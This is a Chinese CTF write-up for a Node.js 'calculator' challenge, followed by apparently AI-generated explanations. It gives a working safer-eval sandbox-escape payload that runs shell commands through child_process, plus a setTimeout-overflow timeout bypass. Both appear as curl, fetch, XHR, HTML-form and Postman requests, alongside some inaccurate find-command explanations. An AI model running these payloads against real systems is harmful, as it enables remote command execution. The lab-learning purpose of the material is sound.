# NodeJS safer-eval漏洞利用 WP

## 题目信息
- 题目名称：计算器
- 目标URL：http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/
- 题目类型：NodeJS代码执行

## 信息收集

### 1. 端口和服务探测
通过curl命令获取目标网站的基本信息：
```bash
curl -I http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/
```

响应头信息显示：
```
HTTP/1.1 200 OK
Server: openresty
X-Powered-By: Express
```

这表明目标使用了Node.js的Express框架。

### 2. 页面功能分析
访问主页发现一个简单的计算器界面，包含两个链接：
- `/source` - 源代码
- `/version` - 版本信息

### 3. 源代码分析
通过访问`/source`获取到应用的源代码：

```javascript
const express = require('express');
const bodyParser = require('body-parser');

const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库

const fs = require('fs');

const app = express();

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) => {
  if (req.path === '/eval') {
    let delay = 60 * 1000;
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() => next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {

      }
    }, 1000);
  } else {
    next();
  }
});

app.post('/eval', function (req, res) {
  let response = '';
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);
    } catch (e) {
      response = 'Wrong Wrong Wrong!!!!';
    }
  }
  res.send(String(response));
});

// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});

// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get('/version', function (req, res) {
  res.set('Content-Type', 'text/json;charset=utf-8');
  res.send(fs.readFileSync('./package.json'));
});

app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  res.send(fs.readFileSync('./index.html'))
})

app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

### 4. 版本信息分析
通过访问`/version`获取到依赖版本信息：
```json
{
  "name": "src",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "dependencies": {
    "body-parser": "1.19.0",
    "express": "4.17.1",
    "safer-eval": "1.3.6"
  }
}
```

## 漏洞分析

### 1. safer-eval 1.3.6漏洞
通过搜索发现，`safer-eval` 1.3.6版本存在沙箱逃逸漏洞，允许攻击者执行任意代码。

GitHub安全公告：https://github.com/advisories/GHSA-v63x-xc9j-hhvq

### 2. 超时机制绕过
源代码中存在一个超时机制，会限制表达式计算时间：
```javascript
let delay = 60 * 1000;
if (Number.isInteger(parseInt(req.query.delay))) {
  delay = Math.max(delay, parseInt(req.query.delay));
}
```

但是通过研究发现，可以使用整数溢出的方法绕过这个限制。当delay参数大于2147483647时，setTimeout会将其设置为1，从而绕过超时限制。

## 漏洞利用

### 1. 绕过超时限制
使用delay参数设置为2147483648来绕过超时限制：
```
delay=2147483648
```

### 2. 构造沙箱逃逸payload
使用以下payload来获取process对象并执行命令：
```javascript
(function(){
  var process=clearImmediate.constructor('return process')();
  return process.mainModule.require('child_process').execSync('cat /flag').toString()
})()
```

### 3. 完整的攻击请求
```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('cat /flag').toString()})()"
```

✦ 在CTF题解中，攻击者使用POST方法发送payload而不是放在URL里，主要有以下几个原因：

   1. HTTP规范和数据大小限制
      - 源代码给出的e为body中，不在POST数据中。

   2. 参数命名约定
      - e=是代码中明确指定的参数名：
   1      if (req.body.e) {
   2        response = saferEval(req.body.e);
   3      }
      - 服务端代码只处理req.body.e，所以必须用这个参数名

   3. 绕过检测
      - 将攻击代码放在POST body中比URL参数更隐蔽
      - 一些安全设备对URL参数的检测更严格

  关于delay参数放在URL中的原因：
   - 它是查询参数，用于控制超时机制
   - 查询参数通常用于配置行为，而不是传输主要数据
   - 代码中通过req.query.delay获取这个参数



## 攻击过程

### 1. 验证漏洞存在
首先验证目标是否存在flag文件：
```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('ls -la').toString()})()"
```

返回结果：
```
total 40
drwxr-xr-x    1 root     root          4096 May 22  2020 .
drwxr-xr-x    1 root     root          4096 Nov  5 06:46 ..
-rw-r--r--    1 root     root          1703 Apr  8  2020 index.html
-rw-r--r--    1 root     root          1832 Apr  8  2020 index.js
drwxr-xr-x   54 root     root          4096 May 22  2020 node_modules
-rw-r--r--    1 root     root           189 Apr  8  2020 package.json
-rw-r--r--    1 root     root         15148 May 22  2020 yarn.lock
```

### 2. 查找flag文件
```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('find / -name flag* -type f 2>/dev/null').toString()})()"
```

发现flag文件位于`/flag`。

### 3. 读取flag内容
```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('cat /flag').toString()})()"
```

成功获取flag：
```
flag{3dcbe01d-3813-4e52-87a1-9cf2564075ce}
```

## 漏洞修复建议

### 1. 升级safer-eval库
将safer-eval库升级到最新版本，或者使用更安全的替代方案。

### 2. 输入验证和过滤
对用户输入进行严格的验证和过滤，避免直接执行用户提供的表达式。

### 3. 使用更安全的沙箱
考虑使用更安全的沙箱环境，如VM2等。

### 4. 限制超时机制
修复超时机制中的逻辑漏洞，确保无法通过整数溢出绕过。

## 总结

这道题目主要考察了对Node.js沙箱逃逸漏洞的理解和利用能力。通过分析源代码，我们发现了以下关键点：

1. 使用了存在漏洞的safer-eval库（1.3.6版本）
2. 存在可被绕过的超时机制
3. 通过构造特定的payload实现沙箱逃逸并执行系统命令

在实际的安全测试中，应该避免在生产环境中使用存在已知漏洞的第三方库，并对用户输入进行严格的验证和过滤。



----




          
让我详细解释这段代码的作用以及如何在浏览器中实现类似攻击。

### 代码分析

这段代码是一个针对Node.js `safer-eval` 模块漏洞的攻击载荷，让我们逐步分析：

```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('ls -la').toString()})()"
```

1. **目标URL**: `http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648`
   - 这是一个CTF练习平台的靶场地址
   - `/eval` 端点可能存在代码执行漏洞
   - `delay` 参数可能是用于绕过某些限制

2. **攻击载荷分析**:
   ```javascript
   (function(){
       var process=clearImmediate.constructor('return process')();
       return process.mainModule.require('child_process').execSync('ls -la').toString()
   })()
   ```
   
   - `clearImmediate.constructor('return process')()` - 这是一种绕过沙箱限制的技术，通过构造函数获取到Node.js的`process`对象
   - `process.mainModule.require('child_process')` - 通过`process`对象获取Node.js的`child_process`模块
   - `execSync('ls -la')` - 执行系统命令`ls -la`列出目录内容
   - `.toString()` - 将执行结果转换为字符串返回

### 在浏览器中实现攻击的方法

要在浏览器中实现类似的攻击，你可以使用以下几种方法：

#### 方法一：使用浏览器开发者工具的Fetch API

1. 打开目标网站
2. 按F12打开开发者工具
3. 切换到Console标签页
4. 执行以下JavaScript代码：

```javascript
fetch("http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('ls -la').toString()})()"
})
.then(response => response.text())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

#### 方法二：使用XMLHttpRequest

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        console.log(xhr.responseText);
    }
};
xhr.send("e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('ls -la').toString()})()");
```

#### 方法三：创建HTML表单

创建一个HTML文件，包含以下内容：

```html
<!DOCTYPE html>
<html>
<head>
    <title>Attack Form</title>
</head>
<body>
    <form action="http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" method="POST">
        <textarea name="e" rows="10" cols="100">(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('ls -la').toString()})()</textarea>
        <br>
        <input type="submit" value="Execute Attack">
    </form>
</body>
</html>
```

### 安全注意事项

1. **仅在授权环境中使用**: 这种技术只能在你有明确授权的测试环境中使用，例如CTF练习平台。
2. **法律风险**: 未经授权对他人系统进行攻击是违法行为。
3. **防护措施**: 网站开发者应该对用户输入进行严格验证和过滤，避免直接执行用户提供的代码。

### 漏洞原理

这个漏洞利用了`safer-eval`模块的一个缺陷，该模块本应提供一个安全的JavaScript代码执行环境，但攻击者通过以下方式绕过了安全限制：

1. 利用`clearImmediate.constructor`获取到原始的构造函数
2. 通过构造函数获取到Node.js的`process`全局对象
3. 通过`process`对象访问到`require`函数
4. 加载`child_process`模块执行系统命令

这是一个典型的沙箱逃逸漏洞，提醒开发者在处理用户输入的代码执行时需要格外小心。



----




          

        
            
toolName: web_search
            
status: success
          
query: Node.js safer-eval vulnerability exploitation
          

        
            
toolName: web_search
            
status: success
          
query: safer-eval npm package vulnerability exploit
          

        
            
toolName: web_search
            
status: success
          
query: safer-eval Node.js bypass security exploit
          

        
            
toolName: web_search
            
status: success
          
query: safer-eval npm package GitHub repository
          

        
            
toolName: web_search
            
status: success
          
query: safer-eval vulnerability exploit payload construction
          

        
            
toolName: web_search
            
status: success
          
query: Node.js process object child_process module command execution
          

        
            
toolName: web_search
            
status: success
          
query: clearImmediate constructor return process bypass safer-eval
          

        
            
toolName: search_codebase
            
status: success
          
query: Node.js safer-eval vulnerability exploit CTF
          

        
            
toolName: search_by_regex
            
status: success
          
query: clearImmediate\.constructor\('return process'
          
现在我来为您详细解释这段代码的工作原理，以及如何在 Apifox 或 Postman 中填写参数进行攻击。

### 代码工作原理解析

您提供的 curl 命令如下：

```bash
curl -X POST "http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648" -d "e=(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('cat /flag').toString()})()"
```

这段代码是一个针对 Node.js 应用程序中 `safer-eval` 模块漏洞的利用，让我们逐步分析它的组成部分和工作原理：

#### 1. 请求结构
- **请求方法**: POST
- **目标URL**: `http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval`
- **查询参数**: `delay=2147483648`
- **请求体**: `e=(function(){...})()`

#### 2. delay 参数的作用
`delay=2147483648` 是一个非常大的数字，它利用了 JavaScript 中 `setTimeout` 函数的整数溢出特性。当传入超过 32 位有符号整数最大值 (2147483647) 的数值时，`setTimeout` 会将其重置为 1，从而绕过服务器端设置的超时限制。

#### 3. Payload 分析
核心的 payload 是这段 JavaScript 代码：
```javascript
(function(){
  var process=clearImmediate.constructor('return process')();
  return process.mainModule.require('child_process').execSync('cat /flag').toString()
})()
```

让我们逐行解释：

1. `(function(){ ... })()` - 这是一个立即执行函数表达式 (IIFE)，用于封装代码并立即执行。
2. `var process=clearImmediate.constructor('return process')();` - 这是整个攻击的关键部分：
   - `clearImmediate` 是 Node.js 中的一个全局函数。
   - `.constructor` 属性指向创建该对象的构造函数，在这里是 `Function` 构造函数。
   - `Function('return process')` 创建了一个新函数，该函数返回 `process` 对象。
   - 最后的 `()` 立即执行这个新创建的函数，从而获得 `process` 对象。
3. `process.mainModule.require('child_process')` - 通过 `process` 对象获取主模块，并使用其 `require` 方法加载 `child_process` 模块。
4. `execSync('cat /flag')` - 使用 `child_process` 模块的 `execSync` 方法执行系统命令 `cat /flag`，读取 flag 文件的内容。
5. `.toString()` - 将执行结果转换为字符串返回。

#### 4. 漏洞原理
这个攻击利用了 `safer-eval` 沙箱的两个弱点：
1. 沙箱未能完全隔离 Node.js 的全局对象，使得攻击者可以通过原型链或构造函数获取到 `process` 对象。
2. `safer-eval` 允许访问某些被认为是安全的对象和方法，但实际上这些对象可以被滥用以突破沙箱限制。

### 在 Apifox 中进行攻击

1. 打开 Apifox，点击"新建接口"。
2. 设置请求方法为 `POST`。
3. 在 URL 栏输入: `http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval`
4. 点击"Params"选项卡，添加查询参数：
   - Key: `delay`
   - Value: `2147483648`
5. 点击"Body"选项卡，选择"x-www-form-urlencoded"类型。
6. 添加表单字段：
   - Key: `e`
   - Value: `(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('cat /flag').toString()})()`
7. 点击"发送"按钮执行请求。

### 在 Postman 中进行攻击

1. 打开 Postman，创建一个新请求。
2. 设置请求方法为 `POST`。
3. 在 URL 栏输入: `http://3267bcf4-d6f3-48b2-adf0-1814388c8c14.node5.buuoj.cn:81/eval?delay=2147483648`
4. 点击"Body"选项卡，选择"x-www-form-urlencoded"选项。
5. 添加键值对：
   - Key: `e`
   - Value: `(function(){var process=clearImmediate.constructor('return process')();return process.mainModule.require('child_process').execSync('cat /flag').toString()})()`
6. 点击"Send"按钮执行请求。

这两种工具的使用方法基本相同，都是构造一个带有特定查询参数和表单数据的 POST 请求。需要注意的是，这种攻击只能在授权的测试环境中进行，未经授权的攻击是违法行为。

在实际的安全测试中，我们应该：
1. 升级存在漏洞的库到最新版本
2. 对用户输入进行严格验证和过滤
3. 使用更安全的沙箱环境
4. 限制超时机制中的逻辑漏洞


---

使用find寻找flag,find查找flag，find发现flag，find搜索flag
让我为您详细解释这段命令的工作原理和运行方式。

### 命令解析

```bash
find / -name "*flag*" -o -name "*FLAG*" -o -name "*Flag*" -type f 2>/dev/null
```

这是一个在 Unix/Linux 系统中使用的 `find` 命令，用于在文件系统中搜索符合特定条件的文件。让我们逐部分解析：

#### 1. 基本结构
- `find`: 查找命令
- `/`: 搜索起始路径，表示从根目录开始搜索整个文件系统
- `-name`: 按文件名匹配条件搜索
- `-o`: 逻辑"或"操作符，用于连接多个条件
- `-type f`: 指定只查找文件（不包括目录等其他类型）
- `2>/dev/null`: 重定向错误输出到空设备，避免显示权限拒绝等错误信息

#### 2. 搜索条件详解
- `-name "*flag*"`: 查找文件名包含"flag"的文件（不区分大小写匹配）
- `-o -name "*FLAG*"`: 或者查找文件名包含"FLAG"的文件
- `-o -name "*Flag*"`: 或者查找文件名包含"Flag"的文件

这三个条件通过 `-o` 连接，表示满足其中任意一个条件即可。

#### 3. 通配符说明
- `*`: 通配符，匹配任意数量的字符（包括零个字符）
- 因此 `*flag*` 可以匹配如 `flag.txt`、`my_flag_file`、`get_flag` 等文件名

#### 4. 错误重定向
- `2>/dev/null`: 
  - `2` 表示标准错误输出（stderr）
  - `>` 表示重定向操作符
  - `/dev/null` 是一个特殊的设备文件，写入其中的数据会被丢弃
  - 这个操作可以隐藏由于权限不足而无法访问某些目录时产生的错误信息

### 运行方式

#### 在 macOS/Linux 终端中运行：
1. 打开终端（Terminal）
2. 直接输入命令并按回车：
   ```bash
   find / -name "*flag*" -o -name "*FLAG*" -o -name "*Flag*" -type f 2>/dev/null
   ```

#### 命令执行过程：
1. 从根目录 `/` 开始递归遍历整个文件系统
2. 对每个文件检查其名称是否满足三个条件中的任意一个
3. 只返回类型为文件（`-type f`）的结果
4. 将搜索过程中因权限不足等原因产生的错误信息丢弃（`2>/dev/null`）
5. 将匹配的文件路径输出到标准输出

### 实际应用场景

这个命令通常在以下场景中使用：

1. **CTF 竞赛**: 寻找题目中的 flag 文件
2. **系统管理**: 查找特定命名模式的配置文件或日志文件
3. **安全审计**: 查找可能包含敏感信息的文件

### 示例输出
命令可能返回类似以下的结果：
```
/home/user/flag.txt
/var/www/html/FLAG_FILE
/usr/local/etc/secret_flag
```

### 注意事项

1. **权限问题**: 在某些目录可能没有读取权限，这就是为什么要使用 `2>/dev/null` 来隐藏错误信息
2. **性能影响**: 从根目录搜索整个文件系统可能需要较长时间
3. **安全性**: 在生产环境中应谨慎使用此类命令，避免不必要的系统资源消耗

在 CTF 竞赛中，这种命令特别有用，因为 flag 文件可能被放置在文件系统的任何位置，而且可能有不同的命名方式（如 flag、FLAG、Flag 等）。
        